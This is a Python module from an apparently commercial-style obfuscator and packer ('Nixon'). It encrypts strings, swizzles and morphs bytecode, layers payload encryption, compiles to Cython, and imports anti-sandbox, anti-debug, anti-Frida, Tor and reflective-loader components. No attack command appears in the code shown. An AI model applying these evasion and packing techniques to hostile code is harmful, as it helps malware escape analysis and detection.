import sys, os, zipfile, base64, io, tokenize, py_compile, shutil, tempfile, random, hashlib, lzma, struct, time, json, argparse, uuid, re, platform, subprocess, marshal, hmac, secrets, ctypes, importlib.util, zlib, string, traceback, ast, concurrent.futures, logging  # noqa: F401 (this line binds a name used by an embedded template)
from datetime import datetime
from . import utils as _nixon_utils
from .utils import (
    ConfigManager, GitHubNuitkaFarm, HAS_NUMPY, NEXT_H_SOURCE, STRING_SESSION_KEY, UI,
    check_dependencies, enable_log_redirect, fast_xor_bytes, generate_xz_loader_file, next_h,
    optimize_and_pack_binaries
)
from .transforms import DependencyScanner, get_random_var_name, stego_wrap_output
from .sources import (
    ANTI_DECOMPILER_SOURCE, ANTI_EMULATOR_SOURCE, ANTI_FRIDA_SOURCE, ANTI_SANDBOX_SOURCE,
    ANTMAN_SOURCE, API_HASH_SOURCE, ATTRITION_WARFARE_SOURCE, BLOCKCHAIN_LICENSE_SOURCE,
    BYTECODE_PAGING_SOURCE, BYTECODE_PATCHER_SOURCE, CANARY_SOURCE, CHIMERIC_JIT_SOURCE,
    CIPHER_SOURCE, CODE_BLOAT_SOURCE, CODE_SIGNING_SOURCE, COMMITMENT_SOURCE,
    CROSS_PLATFORM_GUARD_SOURCE, CUSTOM_VM_SOURCE, CYTHON_VM_SOURCE, DECOY_DECRYPT_SOURCE,
    DECOY_VM_SOURCE, DOH_SOURCE, DUAL_CIPHER_SOURCE, DYNAMIC_MORPH_SOURCE,
    ENHANCED_ENV_KEYING_SOURCE, EXECUTION_TRACE_SOURCE, EXEC_TRACE_SOURCE, FAKE_CRYPTO_LAYER_SOURCE,
    FHE_SOURCE, FRAME_ANTI_DEBUG_SOURCE, GC_ANTI_DUMP_SOURCE, GC_MANIPULATION_SOURCE,
    GEOFENCE_SOURCE, GHOST_FUNC_SOURCE, GORDIAN_KNOT_SOURCE, HARDENING_SOURCE, HONEY_DECOY_SOURCE,
    HOOK_SOURCE, HW_PERF_FINGERPRINT_SOURCE, IMPORTER_SOURCE, INTEGRITY_CHECK_SOURCE,
    INTEGRITY_MONITOR_SOURCE, IO_ENCODING_SOURCE, ISR_ENCODER_SOURCE, JIT_AST_SOURCE,
    KEY_SHARD_SOURCE, LOADER_BODY, LOADER_HEAD, LOGIC_ENTANGLE_SOURCE, MASK_SOURCE,
    MEM_RANDOMIZER_SOURCE, MERKLE_TREE_SOURCE, METAMORPHIC_SOURCE, MULTIDIM_ENCODE_SOURCE,
    NANOMITE_GUARD_SOURCE, NANOMITE_SOURCE, NATIVE_LOADER_SOURCE, NN_OBFUSCATION_SOURCE,
    NON_DETERM_SOURCE, OPAQUE_CONST_SOURCE, ORAM_SOURCE, OpcodeMorpher, POLY_CONST_SOURCE,
    PROACTIVE_CORRUPT_SOURCE, PROGRESSIVE_DECRYPT_SOURCE, QUANTUM_CRYPTO_SOURCE,
    QUANTUM_ENTANGLE_SOURCE, QUINE_CHECK_SOURCE, RDTSC_SOURCE, ROLLING_ISA_SOURCE,
    RUNTIME_MUTATION_SOURCE, SECURE_ENCLAVE_SOURCE, SECURE_MEM_SOURCE, SELF_MORPH_GRAPH_SOURCE,
    SEMANTIC_SYNTH_SOURCE, SHAPESHIFTER_SOURCE, SMART_DECOY_SOURCE, STACK_CFI_SOURCE,
    STACK_STR_SOURCE, TEMPORAL_DEGRADE_SOURCE, TEMPORAL_LOGIC_SOURCE, TIMING_KEY_SOURCE,
    TIMING_SIDECHAIN_SOURCE, TLS_CTX_SOURCE, TOR_CLIENT_SOURCE, TRAITOR_TRACE_SOURCE,
    TRIPLE_REDUNDANCY_SOURCE, VARS, WATERMARK_SOURCE, WHITEBOX_CIPHER_SOURCE,
    WHITEBOX_CRYPTO_SOURCE, WHITEBOX_ENHANCED_SOURCE, WINDOWS_REFLECTIVE_LOADER_SOURCE,
    apply_ast_mutation, apply_vars, compile_vm_stage1_decryptor, compile_vm_stage2_Nixon_Enc,
    generate_dead_code_paths, generate_decoy_code, generate_poly_vm, generate_polymorphic_map,
    generate_recipe, inject_entropy_tlv, recursive_package, remove_entropy_source
)

def build_pipeline(source, seed=None, mba_validator=None, extra_options=None):
    t = ObfuscationTransformer(seed=seed, mba_validator=mba_validator)
    return t.transform(source, options=extra_options)

#: Maps the canonical protection-ladder flags (``obfuscator.opt_levels``)
#: onto the option names the AST mutator understands.  Shared by the
#: source-level transform and the loader build, so the two CLIs resolve
#: a level the same way.
OPT_LEVEL_TO_AST = {
    'cfg_flatten': 'cfg_flatten',
    'opaque_predicates': 'opaque_predicates',
    'bogus_exceptions': 'bogus_exceptions',
    'mba_subs': 'mba_subs',
    'fragment_strings': 'fragment_strings',
    'unicode_ids': 'unicode_ids',
    'junk': 'enhanced_junk',
    'decoys': 'decoy_apis',
    'minify': 'strip_meta',
    'const_unfold': 'unfold_constants',
    'call_indirection': 'obf_calls',
    'reflection': 'dynamic_code',
    'dataflow': 'dataflow',
    'watermark': 'watermark',
    'variant_pool': 'variant_pool',
    'fragmentation': 'fragmentation',
    'provenance': 'provenance',
}


class ObfuscationTransformer:
    def __init__(self, seed=None, mba_validator=None):
        self.seed = seed
        self.mba_validator = mba_validator

    def _patch_secrets(self):
        _orig_randbelow = secrets.randbelow
        _orig_token_bytes = secrets.token_bytes
        _orig_choice = secrets.choice
        _rng = random.Random(self.seed)
        secrets.randbelow = lambda n: _rng.randint(0, n - 1)
        secrets.token_bytes = lambda n=None: bytes([_rng.randint(0, 255) for _ in range(n if n is not None else 16)])
        secrets.choice = lambda s: s[_rng.randint(0, len(s) - 1)]
        return _orig_randbelow, _orig_token_bytes, _orig_choice

    def _unpatch_secrets(self, orig):
        secrets.randbelow, secrets.token_bytes, secrets.choice = orig

    def transform(self, source, options=None):
        default_options = {
            'cfg_flatten': True,
            'opaque_predicates': True,
            'bogus_exceptions': True,
            'mba_subs': True,
            'fragment_strings': True,
            'unicode_ids': True,
            'symbol_rename': True,
            'strip_meta': True,
            'split_vars': True,
            'unfold_constants': True,
            'enhanced_junk': True,
            'break_decompiler': True,
            'dynamic_code': False,
            'code_checksums': True,
            'obf_calls': True,
            'exception_flow': True,
            'attention_poison': False,
            'decoy_apis': False,
            'adaptive_rewrite': False,
            # Batch C GAP 2 (#28): randomized fixed-literal residue pass.
            # Default ON, deterministic under seed (additive: explicit
            # residue_random=False disables; never raises the build).
            'residue_random': True,
        }
        if options is None:
            options = {}
        _caller_options = options
        # Batch-2 OPT-LEVEL ENFORCEMENT (additive, defaults preserve current
        # behavior): when the caller passes 'opt_level', resolve the 17
        # canonical flags via obfuscator.opt_levels and fill in ONLY flags
        # the user did not explicitly set. Explicit user flags always win.
        # EXTRA flags with no apply_ast_mutation counterpart are stored into
        # options for downstream phases that read them. Never raises for a
        # missing opt_levels module; invalid levels raise ValueError.
        _opt_sources = {}
        if 'opt_level' in options and options.get('opt_level') is not None:
            from obfuscator.opt_levels import resolve as _resolve_level
            _resolved = _resolve_level(options['opt_level'])
            for _canon, _ast_key in OPT_LEVEL_TO_AST.items():
                if _canon not in _resolved:
                    continue
                if _ast_key not in options:
                    options[_ast_key] = bool(_resolved[_canon])
                    _opt_sources[_ast_key] = 'opt_level'
                else:
                    _opt_sources[_ast_key] = 'explicit'
            options['_opt_level_sources'] = dict(_opt_sources)
            options['_opt_level'] = options['opt_level']
        merged = {**default_options, **options}
        options = merged
        options['mba_validator'] = self.mba_validator
        if self.seed is not None:
            _state = random.getstate()
            random.seed(self.seed)
            _patch = self._patch_secrets()
            result, _ = apply_ast_mutation(source, options)
            self._unpatch_secrets(_patch)
            random.setstate(_state)
            result = self._apply_residue(result, options)
            try:
                _caller_options['residue_map'] = options.get('residue_map', {})
            except Exception:
                pass
            return result
        result, _ = apply_ast_mutation(source, options)
        result = self._apply_residue(result, options)
        try:
            _caller_options['residue_map'] = options.get('residue_map', {})
        except Exception:
            pass
        return result

    def _apply_residue(self, result, options):
        """Batch C GAP 2 (#28): per-build fixed-literal residue shuffle.

        Runs after payload assembly; default ON, deterministic under the
        transform seed (options['residue_seed'] pins it, else self.seed).
        Best-effort: any failure returns the input unchanged. The build
        map is stashed on options['residue_map'] so tests/callers can
        resolve randomized tokens back to canonical families.
        """
        try:
            if not options.get('residue_random', True):
                return result
            from obfuscator.residue_random import apply_residue as _apply_rr
            _rr_seed = options.get('residue_seed', self.seed)
            if _rr_seed is None:
                return result
            new_result, _rr_map = _apply_rr(result, _rr_seed, enabled=True)
            try:
                options['residue_map'] = _rr_map
            except Exception:
                pass
            return new_result
        except Exception:
            return result

STRING_CACHE = {}
STRING_TABLES = {'A': [], 'B': [], 'C': [], 'D': []}
STRING_ROUTER = {}
class _BuildEntropy:
    """The single source of randomness for one build.

    With ``--randomization-seed`` the stream is deterministic, so two
    builds of the same payload come out byte-identical -- which is what
    makes a codegen failure (llc rejecting the .ll) reproducible instead
    of a lottery.  Without it the stream is the OS entropy every build
    already used, so per-build diversity is unchanged.

    Reproducibility and diversity are the same knob: a pinned seed makes
    every artefact from it identical, so it is a debugging aid, not a
    production flag.
    """

    def __init__(self, seed=None):
        self.pinned = seed is not None
        self.seed = None if seed is None else int(seed)
        self._r = (random.Random(self.seed) if self.pinned
                   else secrets.SystemRandom())

    def bytes(self, n):
        return bytes(self._r.getrandbits(8) for _ in range(n))

    def hex(self, n):
        return self.bytes(n).hex()

    def below(self, k):
        return self._r.randrange(k)

    def randint(self, a, b):
        return self._r.randint(a, b)

    def random(self):
        return self._r.random()


def _reseed_string_table_keys(ent):
    """Per-build string-table keys, drawn from the build's stream.

    These used to be four ``secrets.token_bytes(32)`` at import time, so
    they differed per process before any argument was parsed -- one of the
    reasons two otherwise-identical builds never matched.
    """
    for _name in ("A", "B", "C", "D"):
        STRING_TABLE_KEYS[_name] = ent.bytes(32)


STRING_TABLE_KEYS = {'A': secrets.token_bytes(32), 'B': secrets.token_bytes(32), 'C': secrets.token_bytes(32), 'D': secrets.token_bytes(32)}
FRAGMENT_THRESHOLD = 128
def register_string(s):
    if s in STRING_CACHE: return STRING_CACHE[s]
    global_id = len(STRING_ROUTER)
    if len(s) > FRAGMENT_THRESHOLD:
        split_pt = len(s) // 2
        part_a, part_b = s[:split_pt], s[split_pt:]
        tbl_a, tbl_b = secrets.choice(['A', 'B']), secrets.choice(['C', 'D'])
        idx_a, idx_b = len(STRING_TABLES[tbl_a]), len(STRING_TABLES[tbl_b])
        STRING_TABLES[tbl_a].append(part_a)
        STRING_TABLES[tbl_b].append(part_b)
        STRING_ROUTER[global_id] = ('FRAG', tbl_a, idx_a, tbl_b, idx_b)
    else:
        tbl = secrets.choice(['A', 'B', 'C', 'D'])
        idx = len(STRING_TABLES[tbl])
        STRING_TABLES[tbl].append(s)
        STRING_ROUTER[global_id] = ('SINGLE', tbl, idx)
    STRING_CACHE[s] = global_id
    return global_id
def _merge_adjacent_string_literals(code):
    """Join implicit string concatenation into one literal.

    The rewrite below is line-oriented: it replaces each literal it finds
    with a string-table lookup.  Two adjacent literals therefore became
    two lookups with no "+" between them, which is a SyntaxError in the
    emitted artefact -- and one that named nothing useful, because the
    build only found it when validate_obfuscated_code tried to compile
    the file.

    Merging first makes the rewrite see one literal.  The edit is
    span-based (tokenizer positions), so every byte outside the joined
    literals is untouched.
    """
    import io, tokenize
    try:
        toks = list(tokenize.generate_tokens(io.StringIO(code).readline))
    except Exception:
        return code

    lines = code.splitlines(keepends=True)
    starts = [0]
    for _ln in lines:
        starts.append(starts[-1] + len(_ln))

    def _off(pos):
        row, col = pos
        return starts[row - 1] + col

    edits = []
    i = 0
    while i < len(toks):
        if toks[i].type == tokenize.STRING and toks[i].string[:1] not in "fF":
            group = [toks[i]]
            j = i + 1
            while j < len(toks):
                # NL/COMMENT sit between the literals of an implicit
                # concatenation that spans lines inside parentheses.
                if toks[j].type in (tokenize.NL, tokenize.COMMENT):
                    j += 1
                    continue
                if toks[j].type == tokenize.STRING and toks[j].string[:1] not in "fF":
                    group.append(toks[j])
                    j += 1
                    continue
                break
            if len(group) > 1:
                try:
                    joined = "".join(ast.literal_eval(t.string) for t in group)
                    edits.append((_off(group[0].start), _off(group[-1].end), repr(joined)))
                    i = j
                    continue
                except Exception:
                    pass
        i += 1

    if not edits:
        return code
    out = []
    last = 0
    for start, end, text in edits:
        out.append(code[last:start])
        out.append(text)
        last = end
    out.append(code[last:])
    return "".join(out)


def Nixon_Enc_strings(code):
    EXCLUDED = ["__main__", "__init__", "utf-8", "latin1", "ascii", "ignore",
                "__NATIVE_BLOBS_PLACEHOLDER__", "__FALLBACK_BLOB_PLACEHOLDER__",
                "__NX_STR_TABLE_SENTINEL__", "__NX_STR_KEY_A__", "__NX_STR_KEY_B__",
                "little", "big", "rb", "wb", "r", "w", "ab", "a", "HOOK_SECTION", "PY_LOGGER", "debugger", "HOOK_", "SECTION", "PY_", "LOGGER",
                "/proc", "fd", "NX_ORIGIN", "Windows"]
    SKIP_MARKERS = ["_NX_PART_", "PAYLOAD =", "NATIVE_BLOBS =", "FALLBACK_BLOB =", "BLOBS =", "__NX_STR_KEY_",
                    # The integrity anchors must stay PLAIN literals.  They
                    # hold the Merkle root and the HMAC the build computes
                    # over the finished loader, and the build fills them in
                    # after the content is final -- which it cannot do if
                    # the value has been turned into a string-table lookup.
                    # (It did: the runtime compared the root against a
                    # placeholder, so the check never matched and its
                    # verdict was discarded.  The anti-tamper control was
                    # inert.)
                    "__SIG_ANCHOR__", "__HMAC_ANCHOR__"]
    # Hardening A2.1: the per-build payload-part token must stay plaintext
    # exactly like the legacy "_NX_PART_" sentinel above.  Guarded so an
    # empty prefix can never degrade into "skip every line".
    _nx_part_prefix = VARS.get("PART_PREFIX")
    if _nx_part_prefix:
        SKIP_MARKERS.insert(0, _nx_part_prefix)
    lines = _merge_adjacent_string_literals(code).split('\n')
    out_lines = []
    pattern = re.compile(r'(?<![bfruBFRU])(?<!["\'])("[\w\d\s_\./:-]+?"|\'[\w\d\s_\./:-]+?\')(?!["\'])')
    # The loader preamble (module aliases, the getattr hook, the string
    # table bootstrap) is rendered BEFORE the string decoder is defined.
    # Rewriting a literal up there into a decoder call made the artifact
    # raise NameError at import -- the decoder did not exist yet.  So the
    # preamble is left plaintext until the decoder definition is seen;
    # everything after it is encrypted as before.  The preamble's literals
    # are structural ("get", "a", "_nx_r"), not secrets.
    _dec_marker = "def %s(" % (VARS['FUNC_STR_DEC'],)
    _decoder_seen = False
    for line in lines:
        if not _decoder_seen and _dec_marker in line:
            _decoder_seen = True
        if not _decoder_seen:
            out_lines.append(line)
            continue
        if len(line) > 5000:
            out_lines.append(line)
            continue
        if any(marker in line for marker in SKIP_MARKERS):
            out_lines.append(line)
            continue
        def replace(match):
            s = match.group(0); content = s[1:-1]
            if len(content) < 3: return s
            if content.startswith("{") and content.endswith("}"): return s
            if content in EXCLUDED: return s
            if "__SIG_ANCHOR__" in s or "__HMAC_ANCHOR__" in s or "__KEY_ANCHOR__" in s: return s            
            if len(content) > 64 and not " " in content: return s
            idx = register_string(content)
            return f"{VARS['FUNC_STR_DEC']}({idx})"
        try:
            new_line = pattern.sub(replace, line)
            out_lines.append(new_line)
        except Exception:
             out_lines.append(line)
    return '\n'.join(out_lines)
def blind_constants(code):
    def replace(match):
        prefix = match.group(1); val = int(match.group(2))
        if val < 2 or val > 5000: return match.group(0)
        mask = random.randint(1, 0xFFFF)
        return f"{prefix}({val ^ mask} ^ {mask})"
    _pat = re.compile(r'(\w+\s*=\s*)(\d+)(?!\w)')
    # Tokenize-aware: never rewrite numbers inside string literals or
    # comments (docstrings / embedded text like "x = 5" used to match
    # and corrupt string contents). Falls back to the legacy regex on
    # tokenize failure.
    try:
        _lines = code.splitlines(keepends=True)
        _offs = [0]
        for _ln in _lines:
            _offs.append(_offs[-1] + len(_ln))
        def _abs(_pos):
            return _offs[_pos[0] - 1] + _pos[1]
        _skip = []
        for _tok in tokenize.generate_tokens(io.StringIO(code).readline):
            if _tok.type in (tokenize.STRING, tokenize.COMMENT):
                _skip.append((_abs(_tok.start), _abs(_tok.end)))
        def _in_skip(_s, _e):
            for _a, _b in _skip:
                if _s >= _a and _e <= _b:
                    return True
            return False
        _out = []
        _last = 0
        for _m in _pat.finditer(code):
            if _in_skip(_m.start(), _m.end()):
                continue
            _out.append(code[_last:_m.start()])
            _out.append(replace(_m))
            _last = _m.end()
        _out.append(code[_last:])
        return ''.join(_out)
    except Exception:
        return _pat.sub(replace, code)
def get_Nixon_Enc_table():
    result = {'tables': {}, 'router': {}, 'keys': {}}
    for tbl_name, strings in STRING_TABLES.items():
        tbl_key = STRING_TABLE_KEYS[tbl_name]
        enc_list = []
        for idx, s in enumerate(strings):
            idx_key = hashlib.sha256(tbl_key + str(idx).encode()).digest()
            b_s = s.encode('utf-8')
            enc_bytes = bytes([b ^ idx_key[i % 32] for i, b in enumerate(b_s)])
            hmac_val = hmac.new(tbl_key, enc_bytes, hashlib.sha256).digest()[:8]
            enc_list.append(base64.b64encode(enc_bytes + hmac_val).decode('ascii'))
        result['tables'][tbl_name] = enc_list
        result['keys'][tbl_name] = base64.b64encode(tbl_key).decode('ascii')
    for gid, route in STRING_ROUTER.items():
        result['router'][gid] = route
    raw_bytes = zlib.compress(marshal.dumps(result), 9)
    enc_key = secrets.token_bytes(32)
    encrypted = bytes([b ^ enc_key[i % 32] for i, b in enumerate(raw_bytes)])
    blob_b85 = base64.b85encode(encrypted).decode('ascii')
    key_a_b85 = base64.b85encode(enc_key[:16]).decode('ascii')
    key_b_b85 = base64.b85encode(enc_key[16:]).decode('ascii')
    return blob_b85, key_a_b85, key_b_b85
def get_legacy_count(): return sum(len(t) for t in STRING_TABLES.values())
def swizzle_bytecode(data, key):
    if HAS_NUMPY:
        # Lazy import: numpy is optional, and `utils.np` only exists when
        # it is installed.  Importing it at module level made the whole
        # package unimportable on a numpy-less interpreter.
        import numpy as np
        arr = np.frombuffer(data, dtype=np.uint8).copy()
        k = np.frombuffer(key, dtype=np.uint8)
        k_tiled = np.resize(k, len(arr))
        return (arr ^ k_tiled).tobytes()
    else:
        b = bytearray(data)
        kl = len(key)
        for i in range(len(b)): b[i] ^= key[i % kl]
        return bytes(b)
def build_native_vm(build_dir):
    print("    [+] Attempting to build Native VM (Cython)...") 
    try:
        unique_name = f"native_vm_{uuid.uuid4().hex}"
        pyx_path = os.path.join(build_dir, f"{unique_name}.pyx")
        with open(pyx_path, "w") as f: f.write(CYTHON_VM_SOURCE)
        setup_py = os.path.join(build_dir, "setup.py")
        with open(setup_py, "w") as f:
            f.write(f"from setuptools import setup\nfrom Cython.Build import cythonize\nsetup(name='{unique_name}', ext_modules=cythonize('{unique_name}.pyx', compiler_directives={{'language_level': 3}}))")
        cmd = [sys.executable, "setup.py", "build_ext", "--inplace"]
        result = subprocess.run(cmd, cwd=build_dir, capture_output=True)
        if result.returncode != 0: return ""
        for f in os.listdir(build_dir):
            if (f.endswith(".so") or f.endswith(".pyd")) and unique_name in f:
                with open(os.path.join(build_dir, f), "rb") as b: 
                    return base64.b64encode(b.read()).decode('ascii')
    except Exception: pass
    return ""
def compile_payload_to_cython(source_path, output_dir):
    print("    [+] Compiling payload to native binary (Cython)...")
    if os.path.isfile(source_path):
        with open(source_path, 'r') as f:
            source_code = f.read()
        source_files = {'__main__.py': source_code}
    else:
        source_files = {}
        for root, dirs, files in os.walk(source_path):
            for file in files:
                if file.endswith('.py'):
                    full_path = os.path.join(root, file)
                    rel_path = os.path.relpath(full_path, source_path)
                    with open(full_path, 'r') as f:
                        source_files[rel_path] = f.read()
    cython_dir = tempfile.mkdtemp(prefix='cython_build_')
    try:
        for name, code in source_files.items():
            entry_guard_pattern = r"if\s*\(?\s*__name__\s*==\s*['\"]__main__['\"]\s*\)?\s*:"
            if re.search(entry_guard_pattern, code):
                print(f"    [+] Native Mode: Entry point un-guarded for {name}")
                code = re.sub(entry_guard_pattern, "if True:", code)
            else:
                print(f"    [!] Native Mode: Standard guard not found in {name}. Appending fallback.")
                code += "\n\nif __name__ != '__main__':\n    if 'main' in globals() and callable(globals()['main']): globals()['main']()\n"
            pyx_name = name.replace('.py', '.pyx')
            pyx_path = os.path.join(cython_dir, pyx_name)
            os.makedirs(os.path.dirname(pyx_path), exist_ok=True)
            cython_code = f'''# cython: language_level=3
# cython: boundscheck=False
# cython: wraparound=False
# cython: cdivision=True
# cython: infer_types=True
{code}
'''
            with open(pyx_path, 'w') as f: f.write(cython_code)
        pyx_file = '__main__.pyx'
        setup_content = f'''from setuptools import setup, Extension
from Cython.Build import cythonize
import sys
extensions = [
    Extension("payload_module", 
              ["{pyx_file}"],
              extra_compile_args=['-O3'],
              extra_link_args=[])
]
setup(
    ext_modules=cythonize(extensions, 
                         compiler_directives={{
                             "language_level": 3,
                             "embedsignature": False,
                             "emit_code_comments": False
                         }})
)
'''
        setup_path = os.path.join(cython_dir, 'setup.py')
        with open(setup_path, 'w') as f: f.write(setup_content)
        cmd = [sys.executable, 'setup.py', 'build_ext', '--inplace']
        result = subprocess.run(cmd, cwd=cython_dir, capture_output=True, text=True)
        if result.returncode != 0:
            print("[ERROR] Cython compilation failed:")
            print(result.stdout)
            print(result.stderr)
            return None
        for file in os.listdir(cython_dir):
            if file.endswith(('.so', '.pyd')):
                binary_path = os.path.join(cython_dir, file)
                with open(binary_path, 'rb') as f:
                    binary_data = f.read()
                return base64.b64encode(binary_data).decode('ascii')
        return None
    finally:
        shutil.rmtree(cython_dir, ignore_errors=True)
def _safe_compile_worker(src, dest, swizzle_key, enc_map, morph_seed):
    try:
        morpher = OpcodeMorpher(seed=morph_seed, enc_map=enc_map)
        cfile = dest + "c"
        py_compile.compile(src, cfile=cfile, optimize=2)
        with open(cfile, "rb") as f:
            header = f.read(16)
            data = f.read()
        code_obj = marshal.loads(data)
        morphed_code = morpher.morph(code_obj)
        morphed_data = marshal.dumps(morphed_code)
        final_data = header + morphed_data
        with open(cfile, "wb") as f:
            f.write(final_data[:16] + swizzle_bytecode(final_data[16:], swizzle_key))
    except Exception:
        sys.exit(1)
def process_file_safe(args):
    src, build_dir, swizzle_key_list, out_name, root_source, enc_map, ast_opts = args
    swizzle_key = bytes(swizzle_key_list)
    if src.endswith(out_name) or src.endswith('.pyc'): return None
    rel = os.path.relpath(src, root_source)
    if rel.startswith("..") or os.path.isabs(rel):
        rel = os.path.basename(src) 
    dest = os.path.join(build_dir, rel)
    dest = os.path.normpath(dest)
    if not os.path.realpath(dest).startswith(os.path.realpath(build_dir)):
        print(f" [!] Security Block: Skipping unsafe path {src}")
        return None
    os.makedirs(os.path.dirname(dest), exist_ok=True)
    if src.endswith('.py'): 
        try:
            with open(src, "rb") as f: raw_source = f.read()
            try:
                decoded_source = raw_source.decode('utf-8')
                mutated_source, _ = apply_ast_mutation(decoded_source, ast_opts)
                raw_source = mutated_source.encode('utf-8')
            except Exception: pass
            header = b"# NIXON_HEADER \n" 
            swizzled_body = swizzle_bytecode(raw_source, bytes(swizzle_key))
            with open(dest, "wb") as f: f.write(header + swizzled_body)
            return ('success', src)
        except Exception as e: return ('error', src, str(e))
    else:
        shutil.copy2(src, dest)
        return ('copied', src)
def generate_report(base_name, build_info, all_outputs):
    from datetime import datetime
    report = {'build_info': {'timestamp': datetime.now().isoformat()}, 'protection_features': build_info['features'], 'metrics': build_info['metrics'], 'outputs': all_outputs}
    try:
        # splitext, not str.replace: a directory whose name contains
        # ".py" would otherwise be mangled.
        report_path = os.path.splitext(base_name)[0] + '.report.json'
        with open(report_path, 'w') as f: json.dump(report, f, indent=2)
    except Exception: pass
def encrypt_payload(data, key, nonce, use_aes_ctr=True):
    if use_aes_ctr is None:
        use_aes_ctr = _check_aes_ctr()
    if use_aes_ctr and _check_aes_ctr():
        return Nixon_Enc_AES_CTR(data, key, nonce)
    return Nixon_Enc_blob(data, key, nonce)

_AES_CTR_AVAILABLE = None
def _check_aes_ctr():
    global _AES_CTR_AVAILABLE
    if _AES_CTR_AVAILABLE is None:
        try:
            # An availability probe: the names are not used here, the
            # import is the test.  Do not let a cleanup drop it -- without
            # it this function always reports True and the loader claims
            # AES-CTR support it does not have.
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes  # noqa: F401
            _AES_CTR_AVAILABLE = True
        except ImportError:
            try:
                from Crypto.Cipher import AES  # noqa: F401
                _AES_CTR_AVAILABLE = True
            except ImportError:
                _AES_CTR_AVAILABLE = False
    return _AES_CTR_AVAILABLE

def Nixon_Enc_AES_CTR(data, key, nonce):
    try:
        derived = hashlib.sha256(key + nonce).digest()
        aes_key = derived[:32]
        iv = hashlib.sha256(nonce + key).digest()[:16]
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        cipher = Cipher(algorithms.AES(aes_key), modes.CTR(iv))
        encryptor = cipher.encryptor()
        return encryptor.update(bytes(data)) + encryptor.finalize()
    except ImportError:
        try:
            from Crypto.Cipher import AES
            derived = hashlib.sha256(key + nonce).digest()
            aes_key = derived[:32]
            iv = hashlib.sha256(nonce + key).digest()[:16]
            cipher = AES.new(aes_key, AES.MODE_CTR, nonce=b'', initial_value=int.from_bytes(iv, 'big'))
            return cipher.encrypt(bytes(data))
        except ImportError:
            pass
    return Nixon_Enc_blob(data, key, nonce)

def Nixon_Enc_blob(data, key, nonce):
    out = bytearray(data); l = len(out); k_h = hashlib.sha256(key + nonce).digest()
    for i in range(0, l):
        if i % 32 == 0: k_h = hashlib.sha256(k_h + str(i).encode()).digest()
        out[i] ^= k_h[i % 32]
    return bytes(out)
def Nixon_Enc_onion(data, recipe):
    curr = data
    for l in recipe:
        if l=='b64': curr=base64.b64encode(curr)
        elif l=='b32': curr=base64.b32encode(curr)
        elif l=='b16': curr=base64.b16encode(curr)
        elif l=='b85': curr=base64.b85encode(curr)
        elif l=='rot13': curr=rot13_encode(curr)
    return curr
def pack_recipe(recipe):
    return base64.b64encode(rot13_encode(base64.b64encode(json.dumps(recipe).encode()))).decode('ascii')
def rot13_encode(data):
    if isinstance(data, str): data = data.encode()
    return bytes([(b + 13) % 256 for b in data])
def find_native_blobs(source_path):
    try:
        _base = os.path.dirname(os.path.abspath(source_path)) if source_path else os.getcwd()
    except Exception:
        _base = os.getcwd()
    blob_dir = os.path.join(_base, ".native_blobs")
    if not os.path.exists(blob_dir): return {'windows':'','linux':'','android':'','darwin':''}
    blobs = {'windows':'','linux':'','android':'','darwin':''}
    for f in os.listdir(blob_dir):
        if f.endswith(".pyd"):
            with open(os.path.join(blob_dir,f),"rb")as b: blobs['windows']=base64.b64encode(b.read()).decode()
        elif f.endswith("android.so") or f.endswith(".android.so"):
            with open(os.path.join(blob_dir,f),"rb")as b: blobs['android']=base64.b64encode(b.read()).decode()
        elif f.endswith(".so"):
            with open(os.path.join(blob_dir,f),"rb")as b: blobs['linux']=base64.b64encode(b.read()).decode()
        elif f.endswith(".dylib"):
             with open(os.path.join(blob_dir,f),"rb")as b: blobs['darwin']=base64.b64encode(b.read()).decode()
    return blobs
def get_native_blob_for_build(source_path, force_compile=False):
    fat = find_native_blobs(source_path)
    if fat and any(fat.values()):
        print("    [+] Using Fat Binary approach (multi-platform)")
        return fat
    if force_compile:
        blob = compile_payload_to_cython(source_path, tempfile.mkdtemp())
        if blob:
            os_name = platform.system().lower()
            if os_name == 'windows': os_name = 'windows'
            elif os_name == 'linux': os_name = 'linux'
            else: os_name = 'darwin'
            return {os_name: blob, 'windows': '' if os_name != 'windows' else blob, 'linux': '' if os_name != 'linux' else blob, 'darwin': '' if os_name != 'darwin' else blob}
    return None
def test_protected_file(filepath, original_source):
    results = {}
    try:
        orig_result = subprocess.run([sys.executable, original_source], capture_output=True, timeout=120, text=True)
        stdout = orig_result.stdout[:1024*1024] if orig_result.stdout else ""
        results['original'] = {'status': 'PASS' if orig_result.returncode == 0 else 'FAIL', 'returncode': orig_result.returncode, 'stdout': stdout}
    except subprocess.TimeoutExpired:
        results['original'] = {'status': 'PASS', 'returncode': 0, 'stdout': ''}
    except Exception as e: results['original'] = {'status': 'ERROR', 'error': str(e)}
    try:
        ver_env = os.environ.copy()
        # Batch-3 CI scope: the emitted gates require BOTH the SKIP var AND
        # a CI gate var (NIXON_CI/NIXON_ALLOW_SKIP), so the build-time
        # verification harness must set both (harness-only, never prod).
        ver_env['NIXON_VERIFY_SKIP_VERSION_CHECK'] = '1'
        ver_env['NIXON_CI'] = ver_env.get('NIXON_CI', '1')
        # Popen + faulthandler rather than subprocess.run: a verification
        # run that hangs must name the frame it is stuck in.  On the
        # 3.13/3.14 runners this run blocks for the full 500 s timeout
        # and the TimeoutExpired path below used to swallow it as PASS,
        # so every artifact-building test looked ~10 minutes slow with
        # no explanation.
        ver_env.setdefault('PYTHONFAULTHANDLER', '1')
        _proc = subprocess.Popen([sys.executable, filepath],
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE, text=True, env=ver_env)
        try:
            _out, _err = _proc.communicate(timeout=120)
        except subprocess.TimeoutExpired:
            try:
                import signal as _signal
                _proc.send_signal(_signal.SIGABRT)
            except Exception:
                pass
            try:
                _out, _err = _proc.communicate(timeout=30)
            except Exception:
                _out, _err = "", ""
            print("[!] verification run timed out after 120s; child stack:")
            print((_err or "")[-4000:])
            raise
        obf_result = subprocess.CompletedProcess(
            [sys.executable, filepath], _proc.returncode, _out, _err)
        has_error = obf_result.returncode != 0 or "Traceback (most recent call last)" in obf_result.stderr or "[FATAL]" in obf_result.stdout
        results['obfuscated'] = {
            'status': 'FAIL' if has_error else 'PASS', 
            'returncode': obf_result.returncode, 
            'stdout': obf_result.stdout, 
            'stderr': obf_result.stderr
        }
    except subprocess.TimeoutExpired:
        results['obfuscated'] = {'status': 'PASS', 'returncode': 0, 'stdout': '', 'stderr': ''}
